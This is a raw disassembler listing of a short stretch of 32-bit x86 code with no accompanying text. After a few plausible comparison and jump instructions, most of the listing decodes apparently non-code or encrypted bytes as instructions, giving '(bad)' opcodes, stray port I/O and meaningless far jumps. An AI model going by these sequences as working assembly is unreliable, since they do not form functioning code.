  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	rcl    bp,0xbc
  41c93f:	out    dx,eax
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x88181812
  41c948:	mov    edi,0x1c04e1fd
  41c94d:	(bad)  
  41c94e:	jmp    0xc205:0x25c7efe8
  41c955:	jno    0x41c941
  41c957:	jbe    0x41c9a0
  41c959:	adc    al,BYTE PTR [ecx]
  41c95b:	mov    ch,0x86
  41c95d:	icebp  
  41c95e:	pop    esi
  41c95f:	push   esp
  41c960:	es das 
  41c962:	jmp    0x9af1:0x25819483
  41c969:	mov    edx,0x4a2cb741
  41c96e:	jae    0x41c96a
  41c970:	pop    ds
  41c971:	mov    eax,0xb9a18289
  41c976:	lahf   
  41c977:	adc    ecx,0x15
  41c97a:	xchg   esp,eax
  41c97b:	xor    bh,BYTE PTR [ebp-0xd174f17]
  41c981:	sbb    al,dl
  41c983:	push   esi
  41c984:	or     eax,0xbe8e5366
  41c989:	rol    dh,0x10
  41c98c:	stos   BYTE PTR es:[edi],al
  41c98d:	nop
  41c98e:	xor    DWORD PTR [ebx-0x69],esp
  41c991:	jp     0x41c97b
  41c993:	jl     0x41c9cb
  41c995:	fdiv   QWORD PTR [esi+0x67]
  41c998:	cwde   
  41c999:	mov    ah,0x96
  41c99b:	sub    esp,esi
  41c99d:	xchg   edi,eax
  41c99e:	outs   dx,BYTE PTR ds:[esi]
  41c99f:	adc    DWORD PTR [ebx+0x62],ebp
  41c9a2:	or     ch,BYTE PTR [eax+0x3f]
  41c9a5:	dec    eax
  41c9a6:	lds    esi,FWORD PTR [eax+0x1b]
  41c9a9:	dec    eax
  41c9aa:	cwde   
  41c9ab:	out    0xa2,al
  41c9ad:	cwde   
  41c9ae:	add    eax,0xf1ec0d90
  41c9b3:	mov    al,0x5c
  41c9b5:	mov    esp,0x4757f36e
  41c9ba:	mov    eax,ds:0xafa4707e
  41c9bf:	jne    0x41c94e
  41c9c1:	repnz fistp QWORD PTR ds:0xb45eda2b
  41c9c8:	xlat   BYTE PTR ds:[ebx]
  41c9c9:	hlt    
  41c9ca:	not    BYTE PTR [esi-0x72]
  41c9cd:	sar    BYTE PTR [ebx-0x2c8462aa],cl
  41c9d3:	mov    ebp,0xf24e9b7
  41c9d8:	test   eax,0xeae0e1c1
  41c9dd:	jne    0x41c9b4
  41c9df:	jmp    0x41c992
  41c9e1:	jp     0x41c9df
  41c9e3:	xor    BYTE PTR [edi+esi*4+0x20],bl
  41c9e7:	jo     0x41ca42
  41c9e9:	leave  
  41c9ea:	or     ah,BYTE PTR [ecx+0x53]
  41c9ed:	es (bad) 
  41c9ef:	aas    
  41c9f0:	mov    al,ds:0xc122536e
  41c9f5:	data16 hlt 
  41c9f7:	leave  
  41c9f8:	mov    bl,0x5c
  41c9fa:	stos   BYTE PTR es:[edi],al
  41c9fb:	arpl   WORD PTR [esi],di
  41c9fd:	fimul  WORD PTR ss:[edx-0x63]
  41ca01:	xchg   edi,eax
  41ca02:	out    0x86,al
  41ca04:	pop    es
  41ca05:	fidivr DWORD PTR [ebx-0x42219d80]
  41ca0b:	cmp    eax,0x190ec27f
  41ca10:	mov    eax,0x7bdeb6c3
  41ca15:	test   BYTE PTR [edi],bh
  41ca17:	mov    edi,0xa9e1a53a
  41ca1c:	scas   al,BYTE PTR es:[edi]
  41ca1d:	in     al,0x48
  41ca1f:	pop    ebp
  41ca20:	jnp    0x41ca0f
  41ca22:	adc    DWORD PTR [edi-0x3d],edx
  41ca25:	shl    ebp,1
  41ca27:	sbb    ah,bh
  41ca29:	inc    edi
  41ca2a:	stc    
  41ca2b:	das    
  41ca2c:	jne    0x41ca9b
  41ca2e:	ret    
  41ca2f:	sti    
  41ca30:	jmp    0x20554da6
  41ca35:	mov    edx,0xbeeabd42
  41ca3a:	mov    esp,0xe4efa3e5
  41ca3f:	xchg   ebp,eax
  41ca40:	mov    edi,edx
  41ca42:	adc    ecx,DWORD PTR [edx+esi*8]
  41ca45:	push   edx
  41ca46:	mov    ah,0xe8
  41ca48:	pop    esp
  41ca49:	dec    esp
  41ca4a:	retf   
  41ca4b:	push   edx
  41ca4c:	push   esi
  41ca4d:	adc    BYTE PTR [ebp-0x1827a2f],ch
  41ca53:	pop    ecx
  41ca54:	push   edx
  41ca55:	xchg   ebp,eax
  41ca56:	lds    ebp,FWORD PTR [edx+0xf]
  41ca59:	mov    esi,0xe2688043
  41ca5e:	test   al,0x6
  41ca60:	iret   
  41ca61:	pop    esp
  41ca62:	add    DWORD PTR [ebp+0x40],ecx
  41ca65:	scas   eax,DWORD PTR es:[edi]
  41ca66:	outs   dx,BYTE PTR ds:[esi]
  41ca67:	dec    edi
  41ca68:	mov    bh,0xe5
  41ca6a:	xor    DWORD PTR [esi-0xb],0x6ce6dbe7
  41ca71:	(bad)  
  41ca72:	pop    ds
  41ca73:	ja     0x41c9fd
  41ca75:	out    0xcf,al
  41ca77:	cmp    al,0x50
  41ca79:	xchg   DWORD PTR [edi-0x18],esi
  41ca7c:	mov    ?,WORD PTR [ecx]
  41ca7e:	jmp    0x41cac1
  41ca80:	sub    eax,0x4d3b4c88
  41ca85:	jae    0x41caa1
  41ca87:	(bad)  
  41ca88:	loope  0x41cad0
  41ca8a:	pminub mm6,QWORD PTR ds:0x54437bfb
  41ca91:	cmp    al,0x2a
  41ca93:	add    al,0xaa
  41ca95:	clc    
  41ca96:	loopne 0x41ca63
  41ca98:	arpl   WORD PTR [ebp+0x6f3f3147],dx
  41ca9e:	mov    bh,0x6e
  41caa0:	pop    ds
  41caa1:	mov    eax,ds:0xe6b18c4
  41caa6:	scas   eax,DWORD PTR es:[edi]
  41caa7:	or     al,BYTE PTR [esi]
  41caa9:	xor    al,BYTE PTR [ebx+0x47]
  41caac:	mov    ds,WORD PTR [eax+0x16]
  41caaf:	rol    BYTE PTR [ecx+0x70a4ad15],0x8c
  41cab6:	inc    edx
  41cab7:	push   edi
  41cab8:	adc    dh,dl
  41caba:	lahf   
  41cabb:	mov    al,BYTE PTR [esi]
  41cabd:	jo     0x41cae5
  41cabf:	mov    ecx,0xba6900dd
  41cac4:	xor    al,0x33
  41cac6:	cwde   
  41cac7:	inc    esi
  41cac8:	ss or  eax,0x9d290a4a
  41cace:	shl    DWORD PTR [esi-0x1d421a7],1
  41cad4:	push   ecx
  41cad5:	test   DWORD PTR [ebx+ecx*4-0x499243d2],0x5e4a5290
  41cae0:	mov    BYTE PTR [ebp+0x64],bl
  41cae3:	ds in  eax,dx
  41cae5:	inc    ecx
  41cae6:	add    BYTE PTR [edx+0x4c44fa6c],al
  41caec:	and    ebp,esi
  41caee:	out    dx,al
  41caef:	in     al,0x87
  41caf1:	xor    dl,BYTE PTR [edi-0x58]
  41caf4:	push   ecx
  41caf5:	xlat   BYTE PTR ds:[ebx]
  41caf6:	inc    BYTE PTR [ebx+0x69aa70bd]
  41cafc:	fucomip st,st(7)
  41cafe:	mov    ebp,0x5988064b
  41cb03:	cwde   
  41cb04:	push   ebx
  41cb05:	sub    DWORD PTR [ebx+0x40],0xf007a3e
  41cb0c:	not    DWORD PTR [eax+0x43713451]
  41cb12:	adc    eax,DWORD PTR [edi+0x5267a1db]
  41cb18:	push   esp
  41cb19:	add    BYTE PTR [ebp-0x7319162a],bh
  41cb1f:	dec    ebp
  41cb20:	loopne 0x41cab1
  41cb22:	mov    cl,0xf4
  41cb24:	inc    eax
  41cb25:	xor    ch,bh
  41cb27:	inc    ebp
  41cb28:	jb     0x41cb23
  41cb2a:	fdivr  QWORD PTR [edi+0x3028d1ca]
  41cb30:	fdivr  DWORD PTR [esp+eiz*8-0x67696d5]
  41cb37:	sbb    ebx,DWORD PTR [ecx-0x72439e65]
  41cb3d:	stos   BYTE PTR es:[edi],al
  41cb3e:	es mov ebx,0x7da94728
  41cb44:	jo     0x41cb1e
  41cb46:	scas   eax,DWORD PTR es:[edi]
  41cb47:	ins    DWORD PTR es:[edi],dx
  41cb48:	imul   edx,DWORD PTR [edi-0x75],0xa8095347
  41cb4f:	adc    eax,0xd2397e71
  41cb54:	sub    dl,al
  41cb56:	cld    
  41cb57:	stos   DWORD PTR es:[edi],eax
  41cb58:	clc    
  41cb59:	ror    DWORD PTR [ebx+eiz*1+0x6a1355f],cl
  41cb60:	cmp    al,bl
  41cb62:	pop    ecx
  41cb63:	sbb    DWORD PTR [edi-0x599ec346],ebx
  41cb69:	jl     0x41cb3a
  41cb6b:	jno    0x41cb2d
  41cb6d:	fistp  WORD PTR cs:[esi]
  41cb70:	dec    eax
  41cb71:	mov    esp,0xcd4355a8
  41cb76:	cdq    
  41cb77:	xchg   DWORD PTR [edx],edx
  41cb79:	xor    eax,0x6028ce35
  41cb7e:	jmp    0x18b7:0xbe152e72
  41cb85:	lahf   
  41cb86:	outs   dx,DWORD PTR ds:[esi]
  41cb87:	lods   eax,DWORD PTR ds:[esi]
  41cb88:	jo     0x41cbc1
  41cb8a:	cmp    ebx,edx
  41cb8c:	push   ss
  41cb8d:	sub    bl,BYTE PTR [edi]
  41cb8f:	ret    0x12f0
  41cb92:	aad    0x92
  41cb94:	adc    dl,dh
  41cb96:	out    dx,al
  41cb97:	adc    DWORD PTR [eax],ecx
  41cb99:	retf   0xc374
  41cb9c:	clc    
  41cb9d:	xor    eax,0x9690b39a
  41cba2:	inc    edx
  41cba3:	neg    DWORD PTR [edi+0x512d887f]
  41cba9:	xor    eax,0xb025e32d
  41cbae:	mov    esp,0xa465ca7c
  41cbb3:	mov    es,edi
  41cbb5:	outs   dx,BYTE PTR ds:[esi]
  41cbb6:	jmp    0x41cb58
  41cbb8:	das    
  41cbb9:	dec    eax
  41cbba:	push   ds
  41cbbb:	pop    esp
  41cbbc:	xor    BYTE PTR [ebx-0x2d7e8fa5],dh
  41cbc2:	mov    dh,0x4d
  41cbc4:	and    BYTE PTR [ebx],dh
  41cbc6:	adc    ch,0x1a
  41cbc9:	fs das 
  41cbcb:	cmp    eax,0x1e573082
  41cbd0:	sub    al,BYTE PTR [edx-0x49]
  41cbd3:	ret    0x52d8
  41cbd6:	mov    bl,0x41
  41cbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbd9:	loop   0x41cb5c
  41cbdb:	in     al,dx
  41cbdc:	mov    ebp,0x4c3bae1b
  41cbe1:	push   0xc5c284bc
  41cbe6:	js     0x41cc36
  41cbe8:	push   ebp
  41cbe9:	mov    ch,ah
  41cbeb:	arpl   WORD PTR [eax+0x7242ef7d],si
  41cbf1:	inc    eax
  41cbf2:	fxch   st(7)
  41cbf4:	scas   eax,DWORD PTR es:[edi]
  41cbf5:	or     bh,ah
  41cbf7:	add    DWORD PTR [eax-0x28],eax
  41cbfa:	fwait
  41cbfb:	add    BYTE PTR [esi+0x7e],ch
  41cbfe:	mov    esi,0x728c78b4
  41cc03:	push   esp
  41cc04:	retf   0xdf3f
  41cc07:	out    dx,eax
  41cc08:	mov    WORD PTR [ebp+ecx*4-0x23],ss
  41cc0c:	fld    st(7)
  41cc0e:	xchg   esp,eax
  41cc0f:	push   edi
  41cc10:	test   BYTE PTR [edx-0x16e3fce3],ah
  41cc16:	sbb    esi,DWORD PTR [esi-0x19]
  41cc19:	std    
  41cc1a:	aas    
  41cc1b:	push   esp
  41cc1c:	jo     0x41cbbe
  41cc1e:	call   0x9d153553
  41cc23:	test   DWORD PTR [esi+edi*2-0x3],eax
  41cc27:	xor    BYTE PTR [edi],al
  41cc29:	mov    ebx,DWORD PTR [ebx-0x4b37d748]
  41cc2f:	xchg   ebp,eax
  41cc30:	adc    bh,BYTE PTR [ebx+eiz*8]
  41cc33:	gs call 0x49e3687b
  41cc39:	add    BYTE PTR [ebx+0x3a],0x4d
  41cc3d:	loopne 0x41cc93
  41cc3f:	add    ebp,DWORD PTR [edi-0xa3a0641]
  41cc45:	jno    0x41cc22
  41cc47:	(bad)  
  41cc48:	and    cl,cl
  41cc4a:	arpl   WORD PTR [edx-0x3],cx
  41cc4d:	in     eax,0x1
  41cc4f:	xor    bh,BYTE PTR [edi]
  41cc51:	mov    esp,0x926746bd
  41cc56:	sbb    al,0xdf
  41cc58:	loop   0x41ccbd
  41cc5a:	es mov cl,0xe9
  41cc5d:	inc    edx
  41cc5e:	fild   QWORD PTR [edx+esi*8]
  41cc61:	adc    BYTE PTR [edx],ah
  41cc63:	push   ds
  41cc64:	mov    BYTE PTR ds:0x68f2e2b0,ah
  41cc6a:	retf   0x497f
  41cc6d:	push   0xffffffde
  41cc6f:	jo     0x41ccc0
  41cc71:	popa   
  41cc72:	adc    bh,BYTE PTR [edi-0x6d6395a8]
  41cc78:	stos   DWORD PTR es:[edi],eax
  41cc79:	inc    eax
  41cc7a:	fsub   QWORD PTR [ecx-0x3a1258d9]
  41cc80:	out    dx,eax
  41cc81:	out    0x27,eax
  41cc83:	dec    esi
  41cc84:	mov    edx,0xe340b630
  41cc89:	int3   
  41cc8a:	fcomp  QWORD PTR [ecx+0x6d]
  41cc8d:	ins    BYTE PTR es:[edi],dx
  41cc8e:	cmp    dh,BYTE PTR [esi-0x458011]
  41cc94:	pushf  
  41cc95:	adc    esi,0x1d73d981
  41cc9b:	into   
  41cc9c:	lods   eax,DWORD PTR ds:[esi]
  41cc9d:	ror    BYTE PTR [ebx],0xd4
  41cca0:	adc    dh,BYTE PTR [ebp+0x13732de5]
  41cca6:	leave  
  41cca7:	daa    
  41cca8:	xchg   esp,eax
  41cca9:	sbb    dl,BYTE PTR [ecx+0x1f7e7178]
  41ccaf:	fisttp DWORD PTR [ecx+esi*2]
  41ccb2:	cwde   
  41ccb3:	dec    edi
  41ccb4:	xchg   esi,eax
  41ccb5:	xchg   esp,eax
  41ccb6:	and    DWORD PTR ds:0x4ef5253c,0xf3e48e81
  41ccc0:	or     eax,0xa4d60613
  41ccc5:	push   eax
  41ccc6:	add    cl,BYTE PTR [edi+0x6168250e]
  41cccc:	mov    dl,0xdc
  41ccce:	arpl   WORD PTR [esi+0x57],sp
  41ccd1:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41ccd3:	js     0x41ccfd
  41ccd5:	mov    es,WORD PTR [ebx]
  41ccd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccd8:	cmp    BYTE PTR [ecx+edx*8],0xf7
  41ccdc:	imul   eax,DWORD PTR [eax],0x49b695b8
  41cce2:	popa   
  41cce3:	stc    
  41cce4:	inc    esi
  41cce5:	jno    0x41cd2b
  41cce7:	add    ch,BYTE PTR [ebp+0x3d]
  41ccea:	push   esi
  41cceb:	push   ebp
  41ccec:	nop
  41cced:	repnz mov ?,WORD PTR [eax+0x124cbdb4]
  41ccf4:	cmp    ecx,DWORD PTR [ebx-0x754ebcb3]
  41ccfa:	dec    esp
  41ccfb:	and    al,0x3c
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0xaa12cb66
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x16881818],bh
  41cd1e:	add    al,0x29
  41cd20:	pusha  
  41cd21:	sbb    DWORD PTR [ebp-0x1c],ebx
  41cd24:	push   ecx
  41cd25:	icebp  
  41cd26:	pop    ss
  41cd27:	stos   BYTE PTR es:[edi],al
  41cd28:	into   
  41cd29:	mul    BYTE PTR [esi+0x36]
  41cd2c:	shr    BYTE PTR [edi],1
  41cd2e:	mov    cl,0xf8
  41cd30:	popa   
  41cd31:	in     al,dx
  41cd32:	or     BYTE PTR [edx+edi*4+0x15],bl
  41cd36:	ins    DWORD PTR es:[edi],dx
  41cd37:	mov    eax,ds:0x7b3b1c17
  41cd3c:	popa   
  41cd3d:	enter  0xe16e,0x97
  41cd41:	inc    esp
  41cd42:	mov    eax,ds:0x3b96db3c
  41cd47:	(bad)  
  41cd48:	adc    edx,DWORD PTR [esi+0x4e]
  41cd4b:	adc    eax,DWORD PTR [ebp-0x8]
  41cd4e:	ins    DWORD PTR es:[edi],dx
  41cd4f:	pop    edx
  41cd50:	inc    esp
  41cd51:	add    DWORD PTR [edi],ecx
  41cd53:	sahf   
  41cd54:	sub    dl,BYTE PTR [ecx]
  41cd56:	adc    BYTE PTR [esi+0x6c],ch
  41cd59:	push   esi
  41cd5a:	pop    ebx
  41cd5b:	adc    edi,edx
  41cd5d:	add    al,0x52
  41cd5f:	xchg   DWORD PTR [esi],edi
  41cd61:	xchg   esi,eax
  41cd62:	mov    al,0x92
  41cd64:	push   0xf386dccf
  41cd69:	sbb    DWORD PTR [esi],esp
  41cd6b:	sbb    esp,DWORD PTR [eax-0xe21ce8b]
  41cd71:	loope  0x41cd1b
  41cd73:	shr    BYTE PTR [ebp+esi*1+0x4],1
  41cd77:	ss std 
  41cd79:	sub    edi,DWORD PTR [ebx]
  41cd7b:	sti    
  41cd7c:	or     eax,0xfc101586
  41cd81:	test   eax,0xcf3a9091
  41cd86:	jne    0x41cd76
  41cd88:	add    DWORD PTR [ecx+0x652fe58e],esi
  41cd8e:	pop    esi
  41cd8f:	bound  ebp,QWORD PTR [esi+eax*8+0x2b]
  41cd93:	push   edi
  41cd95:	bound  esp,QWORD PTR [esi]
  41cd97:	shl    DWORD PTR [edi],0x1d
  41cd9a:	inc    esp
  41cd9b:	imul   ebp,DWORD PTR [esi],0xd106e05e
  41cda1:	outs   dx,DWORD PTR ds:[esi]
  41cda2:	leave  
  41cda3:	jmp    0xa121df1a
  41cda8:	pop    edi
  41cda9:	dec    esp
  41cdaa:	mov    WORD PTR [edi-0x4a51ac6e],cs
  41cdb0:	shl    ch,1
  41cdb2:	cli    
  41cdb3:	dec    ebp
  41cdb4:	into   
  41cdb5:	cmp    bl,BYTE PTR [esi]
  41cdb7:	leave  
  41cdb8:	mov    dl,0x85
  41cdba:	repz ret 
  41cdbc:	dec    ebx
  41cdbd:	out    0x89,eax
  41cdbf:	mov    bl,0xa
  41cdc1:	fs dec esi
  41cdc3:	inc    ebx
  41cdc4:	xchg   esi,eax
  41cdc5:	pop    ebp
  41cdc6:	ja     0x41ce45
  41cdc8:	sub    BYTE PTR [ecx-0x58],al
  41cdcb:	dec    esp
  41cdcc:	iret   
  41cdcd:	rol    DWORD PTR [ebx],0xb1
  41cdd0:	dec    esi
  41cdd1:	(bad)  
  41cdd2:	mov    ecx,0x5ce4a1e1
  41cdd7:	mov    al,ds:0x7ca37426
  41cddc:	outs   dx,BYTE PTR ds:[esi]
  41cddd:	fdiv   QWORD PTR ss:[bp+di]
  41cde1:	das    
  41cde2:	das    
  41cde3:	push   es
  41cde4:	out    0xa2,eax
  41cde6:	les    ebx,FWORD PTR [ecx-0x24721a60]
  41cdec:	jne    0x41ce41
  41cdee:	bound  ebx,QWORD PTR [ebx]
  41cdf0:	dec    esi
  41cdf1:	repnz in al,0xb4
  41cdf4:	retf   
  41cdf5:	imul   esi,DWORD PTR [eax+ebx*8],0xffffffcd
  41cdf9:	jns    0x41ce1d
  41cdfb:	sub    eax,0x48a8dcc3
  41ce00:	add    BYTE PTR [ebx],0x46
  41ce03:	pop    edx
  41ce04:	cmp    ebx,edi
  41ce06:	stc    
  41ce07:	or     cl,BYTE PTR [eax+0x7f]
  41ce0a:	xchg   ebp,ebp
  41ce0c:	fdivrp st(6),st
  41ce0e:	jecxz  0x41ce67
  41ce10:	sahf   
  41ce11:	(bad)  
  41ce12:	mov    edx,0xeb435d05
  41ce17:	mov    ch,0xd6
  41ce19:	lods   eax,DWORD PTR fs:[esi]
  41ce1b:	and    al,0x92
  41ce1d:	mov    al,0x83
  41ce1f:	imul   ebx,DWORD PTR [edi-0x4],0xffffffcc
  41ce23:	xor    cl,BYTE PTR [ebp-0x2f23e105]
  41ce29:	sub    cl,BYTE PTR [eax+0x45]
  41ce2c:	jo     0x41ce36
  41ce2e:	idiv   BYTE PTR [eax]
  41ce30:	or     eax,0x9c903ef2
  41ce35:	mov    esi,fs
  41ce37:	jecxz  0x41ce0f
  41ce39:	addr16 pop ebx
  41ce3b:	push   0x6bdee580
  41ce40:	push   ebp
  41ce41:	sbb    eax,0x9785632c
  41ce46:	mov    dh,0x80
  41ce48:	cwde   
  41ce49:	scas   al,BYTE PTR es:[edi]
  41ce4a:	inc    ecx
  41ce4b:	rol    BYTE PTR [edi],cl
  41ce4d:	shl    BYTE PTR [esi+edx*4+0x502037b1],cl
  41ce54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce55:	fadd   DWORD PTR [ecx-0x60]
  41ce58:	ja     0x41cdeb
  41ce5a:	mov    esp,0x48beeb31
  41ce5f:	adc    ch,BYTE PTR [eax]
  41ce61:	bnd ret 0xced5
  41ce65:	cs icebp 
  41ce67:	(bad)  
  41ce68:	out    dx,al
  41ce69:	xor    DWORD PTR [edx],edx
  41ce6b:	test   eax,0x5453f024
  41ce70:	dec    ecx
  41ce71:	lock mov ebx,0x998a1736
  41ce77:	xchg   esp,eax
  41ce78:	ror    DWORD PTR [ebp+0x3],1
  41ce7b:	rol    BYTE PTR [edi-0x32a6df95],0xe4
  41ce82:	jae    0x41ced1
  41ce84:	mov    al,0x5e
  41ce86:	jns    0x41ceec
  41ce88:	or     DWORD PTR [ebx+0x78],ebx
  41ce8b:	add    al,ch
  41ce8d:	fwait
  41ce8e:	stos   DWORD PTR es:[edi],eax
  41ce8f:	push   esi
  41ce90:	fwait
  41ce91:	cmp    BYTE PTR [edi],ch
  41ce93:	cdq    
  41ce94:	cwde   
  41ce95:	jae    0x41cea1
  41ce97:	in     al,0x14
  41ce99:	repz add DWORD PTR [ebp+0x27],0x1f16a7b8
  41cea1:	xchg   ecx,eax
  41cea2:	pop    ecx
  41cea3:	fisttp DWORD PTR [ebp+0x6e5a0d59]
  41cea9:	mov    DWORD PTR [ebx-0x55723963],ebx
  41ceaf:	xor    eax,0xcf710f50
  41ceb4:	popa   
  41ceb5:	mov    bh,0xe9
  41ceb7:	pusha  
  41ceb8:	dec    esp
  41ceb9:	jbe    0x41cec3
  41cebb:	in     al,0x0
  41cebd:	out    dx,eax
  41cebe:	out    0x5a,eax
  41cec0:	ss dec eax
  41cec2:	stos   DWORD PTR es:[edi],eax
  41cec3:	je     0x41ce64
  41cec5:	push   cs
  41cec6:	pop    ebx
  41cec7:	cwde   
  41cec8:	pop    eax
  41cec9:	mov    ah,0x7e
  41cecb:	cld    
  41cecc:	ret    
  41cecd:	iret   
  41cece:	adc    BYTE PTR [eax+0x23ea08ff],dh
  41ced4:	stos   DWORD PTR es:[edi],eax
  41ced5:	jle    0x41ce70
  41ced7:	das    
  41ced8:	xchg   bl,ch
  41ceda:	xchg   ebx,eax
  41cedb:	js     0x41cf11
  41cedd:	xlat   BYTE PTR ds:[ebx]
  41cede:	loopne 0x41ce8f
  41cee0:	or     BYTE PTR [edx-0x7f],0x7b
  41cee4:	(bad)  
  41cee5:	mov    al,0xd0
  41cee7:	push   esi
  41cee8:	mov    ebx,0x39eccc2f
  41ceed:	xchg   ebx,eax
  41ceee:	xor    al,0x12
  41cef0:	sahf   
  41cef1:	mov    edx,0x943f7e9d
  41cef6:	repz mov ds:0x6cfc64be,al
  41cefc:	jo     0x41cf6d
  41cefe:	mov    bh,0x4d
  41cf00:	shl    BYTE PTR [edi-0x638d9422],0xa7
  41cf07:	pop    es
  41cf08:	cmp    al,0x42
  41cf0a:	or     DWORD PTR [eax+0x33],esp
  41cf0d:	lock repz mov eax,ds:0xe3f4f22f
  41cf14:	xor    al,0xac
  41cf16:	cwde   
  41cf17:	mov    ebx,0xdabd47c2
  41cf1c:	pop    edx
  41cf1d:	cmp    BYTE PTR [eax],bh
  41cf1f:	sbb    bl,BYTE PTR [edx+eax*1]
  41cf22:	clc    
  41cf23:	retf   0x658c
  41cf26:	arpl   WORD PTR [ebp+0x3efe8a88],ax
  41cf2c:	xchg   dh,ah
  41cf2e:	dec    eax
  41cf2f:	popf   
  41cf30:	cmp    BYTE PTR [edi-0x7eb9f878],dl
  41cf36:	sti    
  41cf37:	pop    ds
  41cf38:	scas   eax,DWORD PTR es:[edi]
  41cf39:	push   ebp
  41cf3a:	dec    ebp
  41cf3b:	pop    edx
  41cf3c:	fstp   st(5)
  41cf3e:	test   esp,esp
  41cf40:	mov    bl,0xdc
  41cf42:	test   BYTE PTR [edi],dh
  41cf44:	punpckhwd mm5,QWORD PTR [ebx-0x220c9580]
  41cf4b:	xchg   ebx,eax
  41cf4c:	test   al,0x86
  41cf4e:	xchg   edx,eax
  41cf4f:	dec    esp
  41cf50:	xchg   edx,eax
  41cf51:	jo     0x41ceda
  41cf53:	bound  ebp,QWORD PTR [eax]
  41cf55:	mov    al,0x9
  41cf57:	in     eax,dx
  41cf58:	inc    ebp
  41cf59:	mov    bh,0x4a
  41cf5b:	repz mov esp,0xcd3965c4
  41cf61:	xor    BYTE PTR [eax],cl
  41cf63:	clc    
  41cf64:	add    dl,BYTE PTR [ebp-0x1aa94b1a]
  41cf6a:	or     eax,0x9a5223be
  41cf6f:	sahf   
  41cf70:	cmp    esi,DWORD PTR [esp+eax*8+0x55]
  41cf74:	or     esi,DWORD PTR [edx+eax*2-0x45edf38d]
  41cf7b:	imul   edi,DWORD PTR [ebx+0x46],0x2537b76c
  41cf82:	inc    edi
  41cf83:	das    
  41cf84:	movlps QWORD PTR [ebx-0x2],xmm3
  41cf88:	in     al,0xfd
  41cf8a:	adc    eax,0xcf110930
  41cf8f:	in     eax,0x8a
  41cf91:	xor    ebp,DWORD PTR [ecx-0x46f4dc62]
  41cf97:	(bad)  
  41cf98:	dec    ebx
  41cf99:	out    dx,al
  41cf9a:	ror    BYTE PTR [eax+0x1d1d1d46],1
  41cfa0:	push   0xc542d876
  41cfa5:	cmp    bl,dh
  41cfa7:	jo     0x41cf3a
  41cfa9:	retf   0xca17
  41cfac:	xchg   ebp,eax
  41cfad:	sbb    ecx,DWORD PTR [edx-0x40be958c]
  41cfb3:	xor    DWORD PTR [ecx-0x3b4fc685],esp
  41cfb9:	pop    ebp
  41cfba:	sbb    bl,BYTE PTR [edx]
  41cfbc:	(bad)  
  41cfbd:	test   al,0xcf
  41cfbf:	retf   
  41cfc0:	es ins DWORD PTR es:[edi],dx
  41cfc2:	mov    ecx,0x70c678
  41cfc7:	shl    BYTE PTR [esi+eiz*4],cl
  41cfca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfcb:	mov    ch,0xe4
  41cfcd:	xchg   esp,eax
  41cfce:	gs jle 0x41d02c
  41cfd1:	lock push 0xffffffde
  41cfd4:	shr    DWORD PTR [eax],cl
  41cfd6:	lock add BYTE PTR [ebp+ebp*4-0x41],dl
  41cfdb:	cmp    esp,esi
  41cfdd:	inc    ebx
  41cfde:	adc    eax,0x94915ac3
  41cfe3:	or     dl,BYTE PTR [ebp-0xb]
  41cfe6:	dec    ebp
  41cfe7:	or     DWORD PTR [ebx+0x19e7806c],ebp
  41cfed:	jl     0x41cf97
  41cfef:	inc    ebp
  41cff0:	jge    0x41cffe
  41cff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff3:	mov    ds:0x6a24f893,al
  41cff8:	jle    0x41cf7d
  41cffa:	retf   0x9ea
  41cffd:	mov    bl,0xe2
  41cfff:	mov    ecx,ds
  41d001:	jecxz  0x41cfd5
  41d003:	in     eax,0xda
  41d005:	fst    QWORD PTR [ebx-0x23]
  41d008:	xchg   dl,bh
  41d00a:	fcmovnu st,st(0)
  41d00c:	sub    eax,0x603b38a7
  41d011:	fucomp st(2)
  41d013:	shl    BYTE PTR [edx+0x21],0x37
  41d017:	call   0x30ad:0xd8e82554
  41d01e:	enter  0x7700,0x8
  41d022:	mov    ecx,0xf21868fa
  41d027:	pop    esp
  41d028:	and    eax,0xbe6b0dd
  41d02d:	mov    bh,0x7b
  41d02f:	jl     0x41d033
  41d031:	push   es
  41d032:	loope  0x41d007
  41d034:	or     DWORD PTR [eax-0x5348051f],ebp
  41d03a:	jb     0x41d000
  41d03c:	push   edi
  41d03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d03e:	push   ebx
  41d03f:	jg     0x41cfd3
  41d041:	mov    al,0x17
  41d043:	test   edi,0xab0a316a
  41d049:	xor    al,0x57
  41d04b:	pop    esi
  41d04c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d04d:	cmp    ah,BYTE PTR es:[edi-0x9]
  41d051:	sbb    ch,bh
  41d053:	ja     0x41d0cf
  41d055:	or     esp,DWORD PTR [ebx]
  41d057:	pop    eax
  41d058:	add    ebp,DWORD PTR [eax-0x1c]
